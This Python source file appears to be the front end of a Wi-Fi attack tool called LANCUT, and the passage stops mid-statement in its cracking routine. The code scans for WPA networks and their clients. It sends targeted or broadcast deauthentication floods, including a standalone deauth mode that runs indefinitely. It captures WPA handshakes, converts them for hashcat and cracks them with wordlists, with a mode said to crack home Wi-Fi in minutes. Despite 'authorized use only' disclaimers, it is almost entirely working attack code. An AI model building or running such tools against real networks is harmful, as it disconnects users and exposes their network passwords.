#!/usr/bin/env python3
"""
packet.py — WPA handshake capture helper (airodump-ng / aireplay-ng front-end).

Authorized use only: run this against networks and devices you own or are
explicitly permitted to test. Deauthentication frames disrupt live clients.

Workflow:
  1. pick a wireless interface and put it in monitor mode
  2. live-scan for nearby access points
  3. pick a target AP; the tool finds associated clients
  4. capture on the AP's channel while sending targeted deauths
  5. stop automatically the moment a WPA handshake is captured
  6. restore the card to managed mode on exit (always)
"""

import glob
import json
import os
import re
import shutil
import signal
import subprocess
import sys
import time
from datetime import datetime

# ─── terminal styling ────────────────────────────────────────────────────────
_TTY = sys.stdout.isatty()


def _c(code):
    return code if _TTY else ""


BOLD = _c("\033[1m")
DIM = _c("\033[2m")
BLINK = _c("\033[5m")
RED = _c("\033[31m")
GREEN = _c("\033[32m")
YELLOW = _c("\033[33m")
BLUE = _c("\033[34m")
CYAN = _c("\033[36m")
RESET = _c("\033[0m")


def _rgb(r, g, b):
    return _c(f"\033[38;2;{r};{g};{b}m")


# ─── neon / cyberpunk palette (truecolor, theme-swappable) ───────────────────
# Each theme: (pink/accent1, cyan/accent2, purple/frame, green/ok,
#              blue, yellow, grid, ghost)
THEMES = {
    "synthwave": ((255, 46, 136), (0, 255, 231), (176, 82, 255),
                  (57, 255, 136), (64, 160, 255), (255, 221, 51),
                  (90, 40, 120), (120, 120, 140)),
    "matrix":    ((0, 255, 90), (120, 255, 120), (0, 180, 70),
                  (57, 255, 136), (0, 200, 120), (180, 255, 120),
                  (20, 80, 30), (90, 130, 90)),
    "danger":    ((255, 40, 40), (255, 140, 40), (200, 30, 60),
                  (255, 90, 90), (255, 90, 40), (255, 200, 60),
                  (90, 20, 20), (150, 110, 110)),
    "ice":       ((80, 200, 255), (160, 240, 255), (90, 130, 255),
                  (120, 255, 220), (64, 160, 255), (200, 240, 255),
                  (30, 60, 110), (120, 140, 170)),
    "mono":      ((235, 235, 235), (200, 200, 200), (160, 160, 160),
                  (220, 220, 220), (180, 180, 180), (240, 240, 240),
                  (70, 70, 70), (130, 130, 130)),
}

NEON_PINK = NEON_CYAN = NEON_PURPLE = NEON_GREEN = ""
NEON_BLUE = NEON_YELLOW = GRID = GHOST = ""


CURRENT_THEME = "synthwave"


def set_theme(name):
    """Apply a color theme by name, updating the module-level palette."""
    global CURRENT_THEME
    if name not in THEMES:
        name = "synthwave"
    CURRENT_THEME = name
    pk, cy, pu, gr, bl, ye, gd, gh = THEMES[name]
    g = globals()
    g["NEON_PINK"] = _rgb(*pk)
    g["NEON_CYAN"] = _rgb(*cy)
    g["NEON_PURPLE"] = _rgb(*pu)
    g["NEON_GREEN"] = _rgb(*gr)
    g["NEON_BLUE"] = _rgb(*bl)
    g["NEON_YELLOW"] = _rgb(*ye)
    g["GRID"] = _rgb(*gd)
    g["GHOST"] = _rgb(*gh)
    g["_FRAME"] = g["NEON_PURPLE"]


set_theme("synthwave")


# Customizable defaults (reset target). Operational keys only — never touches
# iface / workdir / scan results / detected tools.
DEFAULT_SETTINGS = {
    "theme": "synthwave",
    "band": "bg",
    "animate": True,
    "scan_secs": 20,
    "dwell": 5,
    "active": False,
    "cap_timeout": 60,
    "deauth_burst": 4,
}


def _config_home():
    """Real user's home even under sudo, so config isn't buried in /root."""
    user = os.environ.get("SUDO_USER")
    if user:
        return os.path.expanduser(f"~{user}")
    return os.path.expanduser("~")


CONFIG_PATH = os.path.join(_config_home(), ".config", "lancut", "settings.json")


def load_settings():
    """Return DEFAULT_SETTINGS overlaid with any saved values."""
    cfg = dict(DEFAULT_SETTINGS)
    try:
        with open(CONFIG_PATH, encoding="utf-8") as fh:
            saved = json.load(fh)
        for k in DEFAULT_SETTINGS:          # only known keys, typed safely
            if k in saved and type(saved[k]) is type(DEFAULT_SETTINGS[k]):
                cfg[k] = saved[k]
        # Persisted capture directory (not part of reset-able defaults).
        if isinstance(saved.get("workdir"), str) and saved["workdir"]:
            cfg["workdir"] = saved["workdir"]
    except (OSError, ValueError):
        pass
    return cfg


def save_settings(state):
    """Persist the customizable keys (and capture dir) to the config file."""
    try:
        os.makedirs(os.path.dirname(CONFIG_PATH), exist_ok=True)
        data = {k: state[k] for k in DEFAULT_SETTINGS if k in state}
        if state.get("workdir"):
            data["workdir"] = state["workdir"]
        with open(CONFIG_PATH, "w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2)
        # If running under sudo, hand ownership back to the real user.
        user = os.environ.get("SUDO_USER")
        if user and shutil.which("chown"):
            run(["chown", "-R", f"{user}:{user}",
                 os.path.dirname(CONFIG_PATH)])
        return True
    except OSError:
        return False


def info(msg):
    print(f"{CYAN}::{RESET} {msg}")


def ok(msg):
    print(f"{GREEN}✓{RESET} {msg}")


def warn(msg):
    print(f"{YELLOW}!{RESET} {msg}")


def err(msg):
    print(f"{RED}✗{RESET} {msg}", file=sys.stderr)


def die(msg, code=1):
    err(msg)
    sys.exit(code)


_LOGO = r"""
 ▄▄           ▄▄     ▄▄▄   ▄▄     ▄▄▄▄   ▄▄    ▄▄  ▄▄▄▄▄▄▄▄
 ██          ████    ███   ██   ██▀▀▀▀█  ██    ██  ▀▀▀██▀▀▀
 ██          ████    ██▀█  ██  ██▀       ██    ██     ██
 ██         ██  ██   ██ ██ ██  ██        ██    ██     ██
 ██         ██████   ██  █▄██  ██▄       ██    ██     ██
 ██▄▄▄▄▄▄  ▄██  ██▄  ██   ███   ██▄▄▄▄█  ▀██▄▄██▀     ██
 ▀▀▀▀▀▀▀▀  ▀▀    ▀▀  ▀▀   ▀▀▀     ▀▀▀▀     ▀▀▀▀       ▀▀
"""


def _gradient_line(text, c1, c2):
    """Fade each character from c1 (r,g,b) to c2 across the string."""
    if not _TTY:
        return text
    n = max(1, len(text) - 1)
    out = []
    for i, ch in enumerate(text):
        r = int(c1[0] + (c2[0] - c1[0]) * i / n)
        g = int(c1[1] + (c2[1] - c1[1]) * i / n)
        b = int(c1[2] + (c2[2] - c1[2]) * i / n)
        out.append(f"\033[38;2;{r};{g};{b}m{ch}")
    return "".join(out) + RESET


def boot_sequence():
    """Short cyberpunk boot animation before the panel opens."""
    lines = [
        (NEON_GREEN, "[ ok ]", "initializing RF subsystem"),
        (NEON_GREEN, "[ ok ]", "loading 802.11 monitor stack"),
        (NEON_CYAN, "[ >> ]", "arming packet injector"),
        (NEON_PINK, "[ !! ]", "authorized-use enforcement active"),
        (NEON_GREEN, "[ ok ]", "neural uplink stable"),
    ]
    for color, tag, msg in lines:
        print(f"  {color}{tag}{RESET} {GHOST}{msg}{RESET}", flush=True)
        if _TTY:
            time.sleep(0.12)
    print()


def banner(animate=True):
    _clear_screen()
    if animate and _TTY:
        boot_sequence()
    # Gradient logo using the active theme's accent colors.
    pk, cy, pu = THEMES[CURRENT_THEME][0], THEMES[CURRENT_THEME][1], \
        THEMES[CURRENT_THEME][2]
    rows = [r for r in _LOGO.split("\n") if r.strip("\n")]
    mid = len(rows) / 2
    for i, row in enumerate(rows):
        c1, c2 = (pk, pu) if i < mid else (pu, cy)
        print("  " + _gradient_line(row, c1, c2))
    tagline = "⟦ LANCUT · WPA PANEL ⟧   authorized use only"
    print("  " + _gradient_line(tagline, cy, pk))
    print(f"  {GRID}{'▁' * 56}{RESET}\n")


# ─── shell helpers ───────────────────────────────────────────────────────────
def run(cmd, check=False, quiet=True):
    """Run a command (list form). Returns CompletedProcess."""
    kw = {}
    if quiet:
        kw.update(stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        kw.update(capture_output=True, text=True)
    return subprocess.run(cmd, check=check, **kw)


def run_critical(cmd):
    """Run a command that must succeed; on failure raise with real stderr."""
    res = subprocess.run(cmd, capture_output=True, text=True)
    if res.returncode != 0:
        detail = (res.stderr or res.stdout or "").strip()
        raise RuntimeError(f"`{' '.join(cmd)}` failed: {detail or 'exit ' + str(res.returncode)}")
    return res


def capture(cmd):
    """Run a command and return stdout as text."""
    return subprocess.run(cmd, capture_output=True, text=True).stdout


def ask(prompt, default=None):
    suffix = f" [{default}]" if default is not None else ""
    try:
        val = input(f"{BOLD}?{RESET} {prompt}{suffix}: ").strip()
    except EOFError:
        val = ""
    return val or (default if default is not None else "")


def ask_int(prompt, lo, hi, default=None):
    while True:
        raw = ask(prompt, default=str(default) if default is not None else None)
        try:
            n = int(raw)
            if lo <= n <= hi:
                return n
        except ValueError:
            pass
        warn(f"enter a number between {lo} and {hi}")


# ─── preconditions ───────────────────────────────────────────────────────────
REQUIRED = ["iw", "ip", "airodump-ng", "aireplay-ng", "aircrack-ng"]


def preflight():
    if os.geteuid() != 0:
        die("must be run as root (try: sudo python packet.py)")
    missing = [t for t in REQUIRED if shutil.which(t) is None]
    if missing:
        die("missing tools: " + ", ".join(missing) +
            "\n  install the aircrack-ng suite and iproute2/iw")
    ok("root privileges and required tools present")


def wireless_interfaces():
    out = capture(["iw", "dev"])
    return [line.split()[1] for line in out.splitlines()
            if line.strip().startswith("Interface")]


def iface_phy(iface):
    """Return the wiphy name (e.g. 'phy0') backing an interface."""
    for line in capture(["iw", "dev", iface, "info"]).splitlines():
        line = line.strip()
        if line.startswith("wiphy"):
            return "phy" + line.split()[1]
    return None


def interface_table():
    """Return list of (phy, iface, type) from `iw dev`."""
    phy = name = None
    rows = []
    for line in capture(["iw", "dev"]).splitlines():
        s = line.strip()
        if s.startswith("phy#"):
            phy = "phy" + s[4:]
        elif s.startswith("Interface "):
            name = s.split()[1]
        elif s.startswith("type "):
            rows.append((phy, name, s.split()[1]))
    return rows


def monitor_iface_on_phy(phy):
    """Return the name of a monitor-type interface on `phy`, or None."""
    for p, name, typ in interface_table():
        if p == phy and typ == "monitor":
            return name
    return None


# ─── optional tooling & hardware capabilities ────────────────────────────────
OPTIONAL = ["hcxdumptool", "hcxpcapngtool", "hashcat", "aircrack-ng", "john"]


def detect_tools():
    return {t: shutil.which(t) is not None for t in OPTIONAL}


def phy_has_5ghz(phy):
    if not phy:
        return False
    return bool(re.search(r"\b5[0-9]{3} MHz", capture(["iw", "phy", phy,
                                                       "info"])))


def select_interface():
    ifaces = wireless_interfaces()
    if not ifaces:
        die("no wireless interfaces found")
    if len(ifaces) == 1:
        ok(f"using the only wireless interface: {BOLD}{ifaces[0]}{RESET}")
        return ifaces[0]
    print()
    info("wireless interfaces:")
    for i, name in enumerate(ifaces, 1):
        print(f"    {BOLD}{i}{RESET}. {name}")
    return ifaces[ask_int("select interface", 1, len(ifaces)) - 1]


# ─── monitor mode (with guaranteed restore) ──────────────────────────────────
class MonitorMode:
    """Context manager: enable monitor mode, restore managed mode on exit.

    Tries several strategies (drivers vary wildly — rtw88 rejects the usual
    ones) and verifies each actually produced a monitor interface before
    accepting it. Exposes `.iface` as the monitor interface name to use.
    """

    def __init__(self, iface):
        self.orig = iface          # the managed interface we started from
        self.phy = iface_phy(iface)
        self.iface = iface          # updated to the monitor iface in __enter__
        self.created_vif = None     # a vif we added and must delete
        self.changed_inplace = None  # an iface whose type we flipped

    def _verify(self):
        """Give the device a moment, then look for a monitor iface on our phy."""
        time.sleep(1)
        return monitor_iface_on_phy(self.phy)

    def _accept(self, monif, how):
        self.iface = monif
        ok(f"monitor mode active on {BOLD}{monif}{RESET} ({how})")
        return self

    def __enter__(self):
        info(f"enabling monitor mode on {BOLD}{self.orig}{RESET} "
             f"({self.phy}) ...")
        if not self.phy:
            raise RuntimeError(f"could not determine the phy for {self.orig}")
        # Clear rfkill soft-blocks, or `ip link set ... up` fails with exit 2.
        if shutil.which("rfkill"):
            run(["rfkill", "unblock", "all"])
        # Kill processes that fight for the card (best effort).
        run(["airmon-ng", "check", "kill"])

        monname = f"{self.orig}mon"

        # Strategy 1: add a dedicated monitor vif alongside the managed one.
        run(["iw", "phy", self.phy, "interface", "add", monname,
             "type", "monitor"])
        run(["ip", "link", "set", monname, "up"])
        found = self._verify()
        if found:
            self.created_vif = found
            return self._accept(found, "added vif")
        run(["iw", "dev", monname, "del"])  # clean up a partial attempt

        # Strategy 2: flip the existing interface in place.
        if self.orig in wireless_interfaces():
            run(["ip", "link", "set", self.orig, "down"])
            run(["iw", "dev", self.orig, "set", "type", "monitor"])
            run(["ip", "link", "set", self.orig, "up"])
            found = self._verify()
            if found:
                self.changed_inplace = self.orig
                return self._accept(found, "in-place")

        # Strategy 3: delete the managed iface, then add a monitor vif.
        run(["iw", "dev", self.orig, "del"])
        run(["iw", "phy", self.phy, "interface", "add", monname,
             "type", "monitor"])
        run(["ip", "link", "set", monname, "up"])
        found = self._verify()
        if found:
            self.created_vif = found
            return self._accept(found, "del+add")

        # Strategy 4: let airmon-ng try its driver-specific handling.
        run(["airmon-ng", "start", self.orig], quiet=False)
        found = self._verify()
        if found:
            self.created_vif = found
            return self._accept(found, "airmon-ng")

        raise RuntimeError(
            f"could not enable monitor mode on {self.orig} ({self.phy}) by any "
            f"method — this driver may not support it. Try the other adapter "
            f"(e.g. wlan1) at the interface prompt.")

    def __exit__(self, *exc):
        info("restoring managed mode ...")
        if self.created_vif:
            run(["ip", "link", "set", self.created_vif, "down"])
            run(["iw", "dev", self.created_vif, "del"])
        elif self.changed_inplace:
            run(["ip", "link", "set", self.changed_inplace, "down"])
            run(["iw", "dev", self.changed_inplace, "set", "type", "managed"])
            run(["ip", "link", "set", self.changed_inplace, "up"])
        # Restart networking — this also recreates any managed iface we deleted.
        if shutil.which("systemctl"):
            run(["systemctl", "restart", "NetworkManager"])
        ok("interface restored")
        return False


# ─── airodump CSV parsing ────────────────────────────────────────────────────
def parse_airodump_csv(path):
    """Return (aps, stations) from an airodump-ng CSV file."""
    aps, stations = [], []
    try:
        with open(path, encoding="utf-8", errors="replace") as fh:
            text = fh.read()
    except FileNotFoundError:
        return aps, stations

    section = None
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("BSSID,"):
            section = "ap"
            continue
        if line.startswith("Station MAC,"):
            section = "sta"
            continue
        cols = [c.strip() for c in line.split(",")]
        if section == "ap" and len(cols) >= 14:
            aps.append({
                "bssid": cols[0],
                "channel": cols[3],
                "privacy": cols[5],
                "power": cols[8],
                "essid": cols[13] or "<hidden>",
            })
        elif section == "sta" and len(cols) >= 6:
            if cols[5] and cols[5] != "(not associated)":
                stations.append({"mac": cols[0], "bssid": cols[5],
                                  "power": cols[3], "packets": cols[4]})
    return aps, stations


def _clear_screen():
    if _TTY:
        print("\033[H\033[J", end="")


def _ap_power(a):
    try:
        return int(a["power"])
    except (ValueError, KeyError):
        return -999


def render_scan(aps, stations, remaining, total):
    """Draw a live AP table with each AP's clients nested beneath it."""
    # Group stations under their AP.
    by_ap = {}
    for s in stations:
        by_ap.setdefault(s["bssid"].upper(), []).append(s)

    wpa = [a for a in aps if "WPA" in a["privacy"]]
    for a in wpa:
        a["clients"] = len(by_ap.get(a["bssid"].upper(), []))
    wpa.sort(key=lambda a: (a["clients"] > 0, _ap_power(a)), reverse=True)

    total_clients = sum(a["clients"] for a in wpa)
    bar = "█" * int(20 * (total - remaining) / total) if total else ""
    _clear_screen()
    print(f"{BOLD}{BLUE}  live scan {RESET} {DIM}{bar:<20}{RESET} "
          f"{remaining:2d}s left   {CYAN}Ctrl-C to stop early{RESET}")
    print(f"  {len(wpa)} WPA networks, {total_clients} clients online\n")
    print(f"  {BOLD}{'PWR':>4}  {'CL':>3}  {'CH':>3}  {'SECURITY':<10}  "
          f"{'BSSID':<17}  ESSID{RESET}")

    for a in wpa[:20]:
        c = f"{GREEN}{a['clients']:>3}{RESET}" if a["clients"] else \
            f"{DIM}{a['clients']:>3}{RESET}"
        print(f"  {a['power']:>4}  {c}  {a['channel']:>3}  "
              f"{a['privacy']:<10}  {a['bssid']:<17}  {a['essid']}")
        # Nested live client list for this AP.
        for s in by_ap.get(a["bssid"].upper(), []):
            print(f"        {CYAN}└─{RESET} {s['power']:>4} dBm  "
                  f"{s['mac']}  {DIM}({s.get('packets', '?')} pkts){RESET}")


def scan(iface, seconds, workdir, band="bg"):
    """Live-scan all channels with an updating on-screen table."""
    prefix = os.path.join(workdir, "scan")
    csv = f"{prefix}-01.csv"
    if os.path.exists(csv):
        os.remove(csv)

    proc = subprocess.Popen(
        ["airodump-ng", "--band", band, "--write", prefix,
         "--output-format", "csv", "--write-interval", "1", iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    aps, stations = [], []
    try:
        for remaining in range(seconds, 0, -1):
            aps, stations = parse_airodump_csv(csv)
            render_scan(aps, stations, remaining, seconds)
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        _stop(proc)
        print()

    return parse_airodump_csv(csv)


def deep_client_sweep(iface, aps, workdir, per_channel=5, active=False):
    """Lock onto each AP channel in turn and accumulate ALL clients.

    Channel-hopping misses clients; parking on each channel for a few seconds
    reliably surfaces every associated station across all APs. With `active`,
    a broadcast deauth is sent each second to provoke idle/hidden clients into
    reassociating so they become visible.
    """
    channels = sorted({a["channel"] for a in aps if a["channel"].isdigit()},
                      key=int)
    if not channels:
        return aps, []

    prefix = os.path.join(workdir, "sweep")
    csv = f"{prefix}-01.csv"
    ap_map = {a["bssid"].upper(): a for a in aps}
    all_stations = {}                       # mac -> latest station record
    total = len(channels) * per_channel
    elapsed = 0

    try:
        for ch in channels:
            if os.path.exists(csv):
                os.remove(csv)
            proc = subprocess.Popen(
                ["airodump-ng", "-c", ch, "--write", prefix,
                 "--output-format", "csv", "--write-interval", "1", iface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            aps_here = [a for a in ap_map.values() if a["channel"] == ch]
            try:
                for _ in range(per_channel):
                    a2, st = parse_airodump_csv(csv)
                    for a in a2:                       # merge any new APs
                        ap_map.setdefault(a["bssid"].upper(), a)
                        if a["channel"] == ch and \
                                a["bssid"].upper() not in \
                                {x["bssid"].upper() for x in aps_here}:
                            aps_here.append(a)
                    for s in st:
                        all_stations[s["mac"].upper()] = s
                    # Active discovery: nudge idle clients into the open.
                    if active:
                        for a in aps_here:
                            run(deauth_cmd(1, a["bssid"],
                                           "FF:FF:FF:FF:FF:FF", iface))
                    render_scan(list(ap_map.values()),
                                list(all_stations.values()),
                                total - elapsed, total)
                    mode = f"{RED}active{RESET}" if active else "passive"
                    print(f"\n  {DIM}sweeping channel {ch} ({mode}) — "
                          f"dedicated listen for the full client list{RESET}")
                    time.sleep(1)
                    elapsed += 1
            finally:
                _stop(proc)
    except KeyboardInterrupt:
        pass
    finally:
        print()

    return list(ap_map.values()), list(all_stations.values())


def choose_ap(aps, stations):
    # Only WPA/WPA2 networks are meaningful handshake targets.
    aps = [a for a in aps if "WPA" in a["privacy"]]
    if not aps:
        die("no WPA/WPA2 access points found in range")

    # Count associated clients per AP — APs with clients are capturable now.
    counts = {}
    for s in stations:
        counts[s["bssid"].upper()] = counts.get(s["bssid"].upper(), 0) + 1
    for a in aps:
        a["clients"] = counts.get(a["bssid"].upper(), 0)

    def pw(a):
        try:
            return int(a["power"])
        except ValueError:
            return -999

    # Sort: APs WITH clients first (best handshake targets), then by signal.
    aps.sort(key=lambda a: (a["clients"] > 0, pw(a)), reverse=True)

    print()
    info("access points (targets with clients first — those are capturable now):")
    print(f"    {BOLD}{'#':>2}  {'CLIENTS':>7}  {'PWR':>4}  {'CH':>3}  "
          f"{'SECURITY':<10}  {'BSSID':<17}  ESSID{RESET}")
    for i, a in enumerate(aps, 1):
        mark = f"{GREEN}{a['clients']:>7}{RESET}" if a["clients"] else \
               f"{DIM}{a['clients']:>7}{RESET}"
        print(f"    {i:>2}  {mark}  {a['power']:>4}  {a['channel']:>3}  "
              f"{a['privacy']:<10}  {a['bssid']:<17}  {a['essid']}")

    choice = aps[ask_int("select target AP", 1, len(aps)) - 1]
    if choice["clients"] == 0:
        warn("this AP has NO associated clients — a 4-way handshake cannot be "
             "captured until a device connects to it.")
        warn("pick an AP with clients (green count), or install hcxdumptool "
             "for a clientless PMKID attempt.")
    return choice


def enumerate_clients(iface, ap, seconds, workdir):
    """Park on the AP's channel to reliably discover connected clients."""
    bssid, channel = ap["bssid"], ap["channel"]
    prefix = os.path.join(workdir, "clients")
    csv = f"{prefix}-01.csv"
    if os.path.exists(csv):
        os.remove(csv)

    info(f"watching {BOLD}{ap['essid']}{RESET} on channel {channel} for "
         f"{seconds}s to find connected clients ...")
    proc = subprocess.Popen(
        ["airodump-ng", "-c", str(channel), "--bssid", bssid,
         "--write", prefix, "--output-format", "csv",
         "--write-interval", "1", iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    clients = {}
    try:
        for remaining in range(seconds, 0, -1):
            _, stations = parse_airodump_csv(csv)
            for s in stations:
                if s["bssid"].upper() == bssid.upper():
                    clients[s["mac"].upper()] = s
            _clear_screen()
            print(f"{BOLD}{BLUE}  live client scan{RESET}  "
                  f"{ap['essid']} (ch {channel})   "
                  f"{remaining:2d}s left   {CYAN}Ctrl-C to stop{RESET}")
            print(f"  {GREEN}{len(clients)}{RESET} client(s) online\n")
            if clients:
                print(f"  {BOLD}{'PWR':>4}  {'PACKETS':>7}  CLIENT MAC{RESET}")
                for s in clients.values():
                    print(f"  {s['power']:>4}  {s.get('packets', '?'):>7}  "
                          f"{s['mac']}")
            else:
                print(f"  {DIM}waiting for clients to transmit…{RESET}")
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        _stop(proc)
        print()
    return list(clients.values())


def choose_client(clients):
    if not clients:
        warn("no clients online right now; will broadcast deauth to the AP "
             "(only captures if a device connects on its own)")
        return "FF:FF:FF:FF:FF:FF"
    ok(f"{BOLD}{len(clients)}{RESET} client(s) online")
    print()
    info("connected clients:")
    print(f"    {BOLD}{'#':>2}  {'PWR':>4}  {'PACKETS':>7}  CLIENT MAC{RESET}")
    print(f"    {BOLD} 0{RESET}                     broadcast (all clients)")
    for i, s in enumerate(clients, 1):
        print(f"    {i:>2}  {s['power']:>4}  {s.get('packets', '?'):>7}  "
              f"{s['mac']}")
    idx = ask_int("select client", 0, len(clients))
    return "FF:FF:FF:FF:FF:FF" if idx == 0 else clients[idx - 1]["mac"]


# ─── capture with handshake detection ────────────────────────────────────────
def has_handshake(cap_file, bssid):
    if not os.path.exists(cap_file):
        return False
    out = capture(["aircrack-ng", "-b", bssid, cap_file]).lower()
    if "1 handshake" in out or "handshake)" in out:
        return "(0 handshake" not in out
    return False


def injection_test(iface):
    """Check whether the card can actually inject (crucial for Realtek rtw88)."""
    info("testing packet injection (aireplay-ng --test) ...")
    out = capture(["aireplay-ng", "--test", iface])
    low = out.lower()
    if "injection is working" in low:
        ok("injection is working on this card")
        return True
    warn("injection does NOT appear to work on this card.")
    warn("Realtek rtw88 adapters commonly can't inject — deauth frames may "
         "silently fail. Capture can still work if a client handshakes on its "
         "own, but forced deauth won't help.")
    return False


def deauth_cmd(count, bssid, client, iface):
    """Build an aireplay-ng deauth command; omit -c for a broadcast deauth."""
    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
    if client and client.upper() != "FF:FF:FF:FF:FF:FF":
        cmd += ["-c", client]
    cmd.append(iface)
    return cmd


def capture_handshake(iface, ap, client, timeout, workdir, burst=4):
    bssid, channel = ap["bssid"], ap["channel"]
    prefix = os.path.join(workdir,
                          f"handshake_{datetime.now():%Y%m%d_%H%M%S}")
    cap_file = f"{prefix}-01.cap"

    info(f"locking to channel {channel}, capturing from {bssid} ...")
    dump = subprocess.Popen(
        ["airodump-ng", "-c", str(channel), "--bssid", bssid,
         "-w", prefix, iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )

    try:
        deadline = time.time() + timeout
        round_no = 0
        while time.time() < deadline:
            round_no += 1
            remaining = int(deadline - time.time())
            print(f"\r  {DIM}deauth round {round_no}, {remaining:3d}s left — "
                  f"waiting for handshake…{RESET}   ", end="", flush=True)
            run(deauth_cmd(burst, bssid, client, iface))
            time.sleep(5)
            if has_handshake(cap_file, bssid):
                print()
                ok(f"{BOLD}{GREEN}handshake captured!{RESET}")
                return cap_file
        print()
        warn("timed out without a handshake "
             "(client may be idle or out of range)")
        return cap_file if os.path.exists(cap_file) else None
    finally:
        _stop(dump)


def deauth_only(iface, ap, client, duration):
    """Standalone deauth: disconnect a target. duration 0 = until Ctrl-C."""
    bssid, channel = ap["bssid"], ap["channel"]
    # aireplay must transmit on the AP's channel.
    run(["iw", "dev", iface, "set", "channel", str(channel)])

    scope = "all clients (broadcast)" if \
        client.upper() == "FF:FF:FF:FF:FF:FF" else client
    info(f"deauthing {BOLD}{scope}{RESET} on {ap['essid']} "
         f"({bssid}, ch {channel})")
    if duration:
        info(f"running for {duration}s — {CYAN}Ctrl-C to stop early{RESET}")
    else:
        info(f"running until {CYAN}Ctrl-C{RESET}")

    bursts = 0
    start = time.time()
    try:
        while True:
            elapsed = time.time() - start
            if duration and elapsed >= duration:
                break
            # Each aireplay --deauth 5 sends 5 bursts, then returns.
            run(deauth_cmd(5, bssid, client, iface))
            bursts += 5
            left = f"{int(duration - elapsed):3d}s left" if duration \
                else f"{int(elapsed):3d}s"
            print(f"\r  {RED}⚡{RESET} deauth bursts sent: {BOLD}{bursts}{RESET}"
                  f"   {DIM}{left}{RESET}   ", end="", flush=True)
    except KeyboardInterrupt:
        pass
    finally:
        print()
    ok(f"stopped — {bursts} deauth bursts sent")


# ─── process teardown ────────────────────────────────────────────────────────
def _stop(proc):
    if proc.poll() is not None:
        return
    proc.terminate()
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()


# ─── post-capture: convert / crack / pmkid / browse ──────────────────────────
def list_captures(workdir):
    """All .cap/.pcapng files in the output dir, newest first."""
    caps = glob.glob(os.path.join(workdir, "*.cap")) + \
        glob.glob(os.path.join(workdir, "*.pcapng"))
    return sorted(caps, key=os.path.getmtime, reverse=True)


def pick_capture(workdir):
    caps = list_captures(workdir)
    if not caps:
        warn("no capture files in the output directory yet")
        return None
    print()
    info("captures:")
    for i, c in enumerate(caps, 1):
        size = os.path.getsize(c) // 1024
        print(f"    {BOLD}{i:>2}{RESET}  {os.path.basename(c):<40} "
              f"{DIM}{size} KB{RESET}")
    return caps[ask_int("select capture", 1, len(caps)) - 1]


def convert_to_hc22000(cap_file, tools):
    """Convert a .cap to hashcat .hc22000; return the output path or None."""
    if not tools["hcxpcapngtool"]:
        warn("hcxpcapngtool not installed (pacman -S hcxtools)")
        return None
    out = os.path.splitext(cap_file)[0] + ".hc22000"
    res = subprocess.run(["hcxpcapngtool", "-o", out, cap_file],
                         capture_output=True, text=True)
    if os.path.exists(out) and os.path.getsize(out) > 0:
        ok(f"converted → {BOLD}{out}{RESET}")
        return out
    warn("no crackable hashes found in that capture "
         "(need a complete handshake or PMKID)")
    if res.stdout:
        print(f"    {DIM}{res.stdout.strip().splitlines()[-1]}{RESET}")
    return None


def do_convert(state):
    cap = pick_capture(state["workdir"])
    if cap:
        convert_to_hc22000(cap, state["tools"])
    ask("press Enter to return to the panel", default="")


def crack_mode_menu(state):
    """Pick what wordlists to crack with. Returns a list of paths, or None."""
    ranked = find_wordlists()
    if not ranked:
        wl = ask("wordlist path", default="/usr/share/wordlists/rockyou.txt")
        return [wl] if wl else None

    quick = crack_set("quick", ranked)
    balanced = crack_set("balanced", ranked)
    full = crack_set("full", ranked)

    def sz(lst):
        return _fmt_size(sum(s for _, s in lst))

    _clear_screen()
    _top()
    _row(f"{NEON_PINK}{BOLD}⚔ CRACK MODE{RESET}",
         f"{GHOST}{len(ranked)} lists found{RESET}")
    _sep()
    _row(f"{NEON_CYAN}q{RESET} Quick",
         f"{GHOST}{len(quick)} lists · {sz(quick)}{RESET}")
    _row(f"{GHOST}    top WPA + rockyou, fastest wins{RESET}")
    _row(f"{NEON_CYAN}b{RESET} Balanced",
         f"{GHOST}{len(balanced)} lists · {sz(balanced)}{RESET}")
    _row(f"{GHOST}    quick tier + strong mid lists{RESET}")
    _row(f"{NEON_CYAN}f{RESET} Full",
         f"{GHOST}{len(full)} lists · {sz(full)}{RESET}")
    _row(f"{GHOST}    EVERY wordlist, best-first{RESET}")
    _row(f"{NEON_CYAN}c{RESET} Choose",
         f"{GHOST}browse & hand-pick{RESET}")
    _sep()
    _row(f"{NEON_CYAN}Enter{RESET} back")
    _bot()
    print(f"\n  {NEON_GREEN}▶ Quick is recommended{RESET} "
          f"{GHOST}— it usually cracks home WiFi in seconds to minutes.{RESET}")
    pick = ask("crack mode", default="q").strip().lower()

    if pick == "q":
        return [p for p, _ in quick]
    if pick == "b":
        return [p for p, _ in balanced]
    if pick == "f":
        warn(f"Full = {sz(full)} across {len(full)} lists — this can run for "
             "hours. Ctrl-C stops any time.")
        if not ask("proceed? [y/N]", default="n").lower().startswith("y"):
            return None
        return [p for p, _ in full]
    if pick == "c":
        chosen = do_wordlists(state)
        if not chosen:
            return None
        return chosen if isinstance(chosen, list) else [chosen]
    return None


def do_crack(state):
    cap = pick_capture(state["workdir"])
    if not cap:
        ask("press Enter to return to the panel", default="")
        return
    chosen = crack_mode_menu(state)
    if not chosen:
        ask("press Enter to return to the panel", default="")
        return

    # Normalize to a list, decompress any .gz, drop missing files.
    wanted = chosen if isinstance(chosen, list) else [chosen]
    wordlists = []
    for wl in wanted:
        if wl.endswith(".gz") and os.path.exists(wl):
            plain = os.path.join(state["workdir"], os.path.basename(wl)[:-3])
            if not os.path.exists(plain):
                info(f"decompressing {os.path.basename(wl)} ...")
                subprocess.run(f"gunzip -c {wl!r} > {plain!r}", shell=True)
            wl = plain
        if os.path.exists(wl):
            wordlists.append(wl)
        else:
            warn(f"skipping missing: {wl}")
    if not wordlists:
        warn("no usable wordlists selected")
        ask("press Enter to return to the panel", default="")
        return
    info(f"cracking with {BOLD}{len(wordlists)}{RESET} wordlist(s) "
